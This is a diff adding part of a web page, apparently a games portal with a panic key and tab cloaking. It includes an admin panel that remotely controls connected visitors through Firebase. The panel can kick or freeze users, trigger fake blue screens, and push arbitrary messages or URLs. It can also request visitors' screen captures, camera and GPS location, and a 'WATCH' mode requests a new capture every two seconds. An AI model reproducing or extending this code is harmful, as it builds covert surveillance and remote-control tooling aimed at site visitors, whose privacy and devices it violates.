+            if(safe.lastCap) document.getElementById('preview').style.backgroundImage = `url(${safe.lastCap})`; else document.getElementById('preview').style.backgroundImage = '';
+        }
+
+        window.adminAct = async (t) => {
+            if (!selectedID) return alert("Select User");
+            const targetRef = ref(db, `presence/${selectedID}`);
+
+            try {
+                if (t === 'kicked') {
+                    if (!confirm('Kick this user?')) return;
+                    await update(targetRef, { kicked: true }).catch(e=>{throw e;});
+                    setTimeout(() => { remove(targetRef).catch(err => logError('Failed to remove presence: ' + (err.message||err))); }, 1200);
+                    selectedID = null;
+                    document.getElementById('dossier').innerHTML = 'Select a user to view intel...';
+                    document.getElementById('preview').style.backgroundImage = '';
+                    if (watchInterval) { clearInterval(watchInterval); watchInterval = null; document.getElementById('watchBtn').style.background="#004400"; document.getElementById('watchBtn').innerText="👁️ WATCH"; document.getElementById('live-indicator').style.display="none"; }
+                    return;
+                }
+
+                if (['frozen','bsod','print','vibrate','reload','capReq','camReq','gpsReq'].includes(t)) {
+                    const val = (t === 'reload' || t === 'print' || t === 'vibrate' || t === 'gpsReq' || t === 'camReq' || t === 'capReq') ? true : null;
+                    if (val !== null) {
+                        await update(targetRef, { [t]: val });
+                    } else {
+                        onValue(ref(db, `presence/${selectedID}/${t}`), (s) => {
+                            let cur = s.val();
+                            update(ref(db, `presence/${selectedID}`), { [t]: !cur }).catch(e=>logError('update failed: '+e.message));
+                        }, { onlyOnce: true });
+                    }
+                    return;
+                }
+
+                onValue(ref(db, `presence/${selectedID}/${t}`), (s) => {
+                    let val = !s.val();
+                    update(ref(db, `presence/${selectedID}`), { [t]: val }).catch(e=>logError('update failed: '+e.message));
+                }, { onlyOnce: true });
+            } catch(e) { logError('adminAct failed: ' + (e.message||e)); alert('Action failed - see error log.'); }
+        };
+
+        window.adminCustom = (t) => {
+            if (!selectedID) return alert("Select User");
+            const payload = document.getElementById('adminCommandInp').value || '';
+            if (!payload.trim()) return alert('Enter a message/URL first.');
+            try {
+                update(ref(db, `presence/${selectedID}`), {[t]: payload});
+                document.getElementById('adminCommandInp').value = '';
+            } catch(e) { logError('adminCustom failed: ' + e.message); alert('Failed: ' + e.message); }
+        };
+
+        window.globalReload = () => {
+            if (!confirm("NUKE? This will ask all connected clients to reload.")) return;
+            onValue(ref(db, 'presence'), s => s.forEach(c => {
+                update(ref(db, `presence/${c.key}`), { reload: true }).catch(e => logError('globalReload update failed: ' + e.message));
+            }), { onlyOnce: true });
+        };
+
+        window.toggleWatch = () => {
+            const btn = document.getElementById('watchBtn'); const ind = document.getElementById('live-indicator');
+            if(watchInterval) { clearInterval(watchInterval); watchInterval=null; btn.style.background="#004400"; btn.innerText="👁️ WATCH"; ind.style.display="none"; }
+            else { 
+                if(!selectedID) return alert("Select User"); 
+                btn.style.background="red"; btn.innerText="⏹ STOP"; ind.style.display="block";
+                update(ref(db,`presence/${selectedID}`),{capReq:true});
+                watchInterval = setInterval(()=>{ if(!selectedID) clearInterval(watchInterval); else update(ref(db,`presence/${selectedID}`),{capReq:true}); }, 2000);
+            }
+        };
+
+        window.toggleCfg = (key) => { cfg[key] = !cfg[key]; document.getElementById('chkEnable').innerText = cfg.enable ? '✓' : ''; };
+        window.panicTrigger = () => { if(!cfg.enable) return; if(activeGameWindow) activeGameWindow.close(); window.location.replace(cfg.url); };
+        window.toggleModal = (id) => { const m = document.getElementById(id); if(!m) return; m.style.display = m.style.display === 'block' ? 'none' : 'block'; };
+        
+        window.addEventListener('keydown', (e) => {
+            try {
+                if (cfg.enable && (e.key === cfg.key || e.code === cfg.key)) panicTrigger();
+
+                // Shift+L: if not logged in -> open login overlay; else open updates
+                if (e.shiftKey && (e.key === 'L' || e.key === 'l')) { 
+                    e.preventDefault();
+                    const appVisible = document.getElementById('app').style.display === 'flex';
+                    if (!appVisible) {
+                        document.getElementById('loginOverlay').style.display = 'flex';
+                    } else {
+                        toggleModal('updatesM');
+                    }
+                    return;
+                }
+            } catch(err){ logError('keydown handler error: ' + err.message); }
+        }, true);
+
+        window.saveConfig = () => {
+            try {
+                cfg.url = document.getElementById('cfgUrl').value; cfg.key = tempKey; cfg.mode = document.getElementById('cfgMode').value;
+                cfg.theme = document.getElementById('cfgTheme').value || cfg.theme;
+                cfg.cloak = document.getElementById('cfgCloak').value || cfg.cloak;
+                localStorage.setItem('pUrl', cfg.url); localStorage.setItem('pKey', cfg.key); localStorage.setItem('pMode', cfg.mode); localStorage.setItem('pEnable', cfg.enable); localStorage.setItem('pTheme', cfg.theme); localStorage.setItem('pCloak', cfg.cloak);
+                applyTheme(cfg.theme);
+                applyCloak(cfg.cloak);
+                alert("SAVED");
+                toggleModal('settingsM');
+            } catch(e) { logError('saveConfig failed: ' + e.message); alert('Save failed.'); }
+        };
+
+        function escapeHtml(s) {
+            if (typeof s !== 'string') return s;
+            return s.replace(/[&<>"']/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+        }
+
+        document.getElementById('cfgUrl').value = cfg.url; document.getElementById('cfgKeyDisp').value = cfg.key.toUpperCase();
+        document.getElementById('cfgMode').value = cfg.mode; document.getElementById('chkEnable').innerText = cfg.enable ? '✓' : '';
+        document.getElementById('cfgTheme').value = cfg.theme;
+        document.getElementById('cfgCloak').value = cfg.cloak;
+        applyTheme(cfg.theme);
+        applyCloak(cfg.cloak);
+
+        /* --- Updates feed functions --- */
+        async function fetchUpdates() {
+            try {
+                const listEl = document.getElementById('updatesList');
+                if (listEl) listEl.innerHTML = 'Loading updates...';
+                const node = ref(db, 'updates');
+                onValue(node, (s) => { renderUpdatesFromSnapshot(s); }, { onlyOnce: true });
+            } catch(e) { logError('fetchUpdates failed: ' + e.message); }
+        }
+
+        function renderUpdatesFromSnapshot(snap) {
+            try {
+                const listEl = document.getElementById('updatesList');
+                if (!listEl) return;
+                if (!snap || !snap.exists()) { listEl.innerHTML = '<div class="update-item">No updates yet.</div>'; return; }
+                const items = [];
+                snap.forEach(c => {
+                    const v = c.val() || {};
+                    items.push({ id: c.key, text: v.text, author: v.author, created: v.created });
+                });
+                items.sort((a,b) => (b.created||'').localeCompare(a.created||''));
+                listEl.innerHTML = items.map(it => {
+                    const t = it.created ? new Date(it.created).toLocaleString() : 'Unknown time';
+                    const auth = it.author || 'SYSTEM';
+                    const safeText = escapeHtml(it.text || '');
+                    return `<div class="update-item"><div>${safeText}</div><span class="update-time">${escapeHtml(auth)} • ${escapeHtml(t)}</span></div>`;
+                }).join('');
+            } catch(e){ logError('renderUpdatesFromSnapshot failed: ' + e.message); }
+        }
+
+        // Admin: push update from admin modal controls
+        window.adminAddUpdate = () => {
+            try {
+                const text = document.getElementById('adminUpdateInp').value || '';
+                if (!text.trim()) return alert('Write something first.');
+                const payload = { text: text.trim(), author: (isAdmin ? 'OVERSEER' : 'ADMIN'), created: new Date().toISOString() };
+                push(ref(db, 'updates'), payload).then(() => {
+                    document.getElementById('adminUpdateInp').value = '';
+                    alert('Update posted.');
+                }).catch(e => { logError('adminAddUpdate push failed: ' + e.message); alert('Failed to post: '+e.message); });
+            } catch(e){ logError('adminAddUpdate error: ' + e.message); }
+        };
+
+        window.adminAddUpdateFromUpdates = () => {
+            try {
+                const text = document.getElementById('updateText').value || '';
+                if (!text.trim()) return alert('Write something first.');
+                const payload = { text: text.trim(), author: (isAdmin ? 'OVERSEER' : 'ADMIN'), created: new Date().toISOString() };
+                push(ref(db, 'updates'), payload).then(() => {
+                    document.getElementById('updateText').value = '';
+                    alert('Update posted.');
+                }).catch(e => { logError('adminAddUpdateFromUpdates push failed: ' + e.message); alert('Failed to post: '+e.message); });
+            } catch(e){ logError('adminAddUpdateFromUpdates error: ' + e.message); }
+        };
+
+        // expose a small function to add a manual error (dev)
+        window._log = (m) => logError(m);
+
+        // Embedded container (kept)
+    </script>
+
+    <!-- Embedded container (client-side) kept for embedding feature -->
+    <div id="embeddedContainer" aria-hidden="true" style="display:none; position: fixed; inset: 44px 10px 10px 10px; z-index:4000000; align-items:center; justify-content:center;">
+        <button class="embeddedClose" onclick="closeEmbedded()" style="position:absolute; top:8px; right:18px; background:#111; color:var(--primary); border:1px solid #222; padding:6px 10px; border-radius:6px; cursor:pointer; z-index:4000010;">CLOSE</button>
+        <iframe id="embeddedFrame" sandbox="allow-same-origin allow-scripts allow-forms allow-popups" style="width:calc(100% - 40px); height:calc(100% - 40px); border:2px solid #222; border-radius:8px; background:#000; box-shadow:0 10px 40px rgba(0,0,0,0.7);"></iframe>
+    </div>
+</body>
+</html>
